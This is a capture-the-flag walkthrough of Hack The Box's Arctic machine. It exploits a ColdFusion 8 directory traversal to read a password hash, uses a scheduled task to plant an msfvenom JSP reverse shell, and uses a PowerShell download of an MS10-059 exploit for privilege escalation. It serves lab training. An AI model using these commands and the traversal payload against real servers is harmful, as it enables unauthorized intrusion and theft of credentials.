# Introduction

Arctic is an "easy" Windows machine on Hackthebox.


# Reconnaissance & Enumeration

```bash
root@kali:~/Documents/boxes/arctic# nmap -sC -sV -O -oN nmap.nmap 10.10.10.11

```

The scan shows two MSRPC services and one unknown that nmap couldn’t pick up. Before checking out what it is exactly, I used rpcclient and tried to connect to the two MSRPC services with anonymous credentials:

```bash
rpcclient -U "" -N -p 135 10.10.10.11
rpcclient -U "" -N -p 49154 10.10.10.11
```

Server timed out, no luck. Back to see whats running on port 8500 so navigating to that port on the browser shows the webpage.

| ![image]({{site.github.url}}/assets/img/htb/arctic/index.png) |
| :--: |
| *Webpage running on port 8500* |

Navigating through the directory I came across an Adobe ColdFusion8 admin portal. Note that the webpages take about 20 seconds to load so be patient.

| ![image]({{site.github.url}}/assets/img/htb/arctic/portal.png) |
| :--: |
| *Adobe ColdFusion8 web portal* |

Searching information about Adobe ColdFusion 8, it came out in July 2007 and the latest version is now ColdFusion 2018. ColdFusion uses its own server-side markup language (CFML) and the application itself was wrote in Java but to verify this we can view the HTTP headers using CURL.

| ![image]({{site.github.url}}/assets/img/htb/arctic/httpheaders.png) |
| :--: |
| *Grabbing HTTP headers gives us more information about the server* |

So, ColdFusion is hosted on a JRun Web Server and that runs on JSP, another server-side language. Quick search on ColdFusion8 exploits and the one I used was: Adobe ColdFusion - Directory Traversal which refers to CVE-2010-2861: 
> “Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.”

The exploit gives us the ability to read file paths using these parameters! Reading the exploit script it shows a directory that looks like it would show us some password properties: ```http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en```

| ![image]({{site.github.url}}/assets/img/htb/arctic/hash.png) |
| :--: |
| *The directory path returned a hashed password on the webpage* |

The portal shows a hashed password that I could attempt to crack. You can use John the ripper or various websites. I used crackstation.net and it successfully cracked the password which turned out to be **happyday**. Logging into the portal you can see everything about the server from “Settings Summary” under Server Setting tab. The info shows the server is running on Windows Vista and I came across important default file paths.

| ![image]({{site.github.url}}/assets/img/htb/arctic/mappings.png) |
| :--: |
| *Important directory mappings. If we get to upload files to the server we'll use these default file paths* |

On the admin portal there is an option for “Scheduled Tasks” which gives us the ability to execute a task from a remote URL! Lovely. We know the server handles CFML and JSP so we can decide on a web shell (CFML) or a complete shell to the machine (JSP), I went for a complete shell but the CFML webshells are under **/usr/share/webshells/cfm** on Kali. Save the task to a file called shell.jsp using the default file path mappings above so we can execute that file from ```http://10.10.10.11/CFIDE/<file>```

| ![image]({{site.github.url}}/assets/img/htb/arctic/task.png) |
| :--: |
| *Creating a task to download a file from my python webserver* |

Create a new directory to host the reverse shell file using a webserver, create a jsp reverse shell using msfvenom and setup your netcat listener. Go the **http://10.10.10.11:8500/CFIDE/shell.jsp** and then wait for your listener to catch that connection.

```bash
root@kali:~/Documents/boxes/arctic/share# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 -f raw > shell.jsp
```

# Privilege Escalation

If you run ```systeminfo``` you can see its running on Windows 2008 and there hasn’t been any patches carried out on the machine. Using Windows Exploit Suggester to find an escalation vulnerability: 

```bash
root@kali:~/Documents/boxes/arctic# python windows-exploit-suggester.py --database 2020-04-10-mssb.xls --systeminfo systeminfo.txt --quiet
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns

```

After some trial and error, MS10-059 gave me that root shell :)

```windows
C:\Users\tolis\Desktop>powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.19:8000/MS10-059.exe','C:\Users\tolis\Desktop\exploit.exe')"

Boom, root privelleges.
